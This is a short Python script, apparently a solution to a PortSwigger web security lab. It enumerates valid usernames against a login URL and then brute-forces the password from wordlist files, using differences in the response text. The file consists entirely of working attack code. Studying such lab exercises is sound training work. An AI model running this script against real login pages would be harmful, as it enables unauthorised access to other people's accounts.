import requests

def find_valid_username(url):
    usernames = []
    password = "test_password_123"

    with open("res/usernames.txt", "r") as file:
        for line in file:
            usernames.append(line.strip())

    for username in usernames:
        data = {"username": username, "password": password}
        try:
            response = requests.post(url, data=data, timeout=10)
            print(f"Trying username: {username}")
        except requests.exceptions.RequestException as e:
            print(f"Error: {e}")
            continue
                
        if "Invalid username or password" in response.text:
            print(f"Valid username found: {username}")
            return username
    return None

def find_valid_password(url, valid_username):
    if not valid_username:
        print("No potential username in list.")
        return None
    
    passwords = []
    
    with open("res/passwords.txt", "r") as file:
        for line in file:
            passwords.append(line.strip())

    for password in passwords:
        data = {"username": valid_username, "password": password}
        try:
            response = requests.post(url, data=data, timeout=10)
            print(f"Trying password: {password}")
        except requests.exceptions.RequestException as e:
            print(f"Error: {e}")
            continue
            
        if "Invalid username or password" not in response.text:
            print(f"Valid password found: {password}")
            return password
        
        
url = "<enter URL here>" ## URL from lab  on portswigger.com :)

find_valid_password(url, find_valid_username(url))
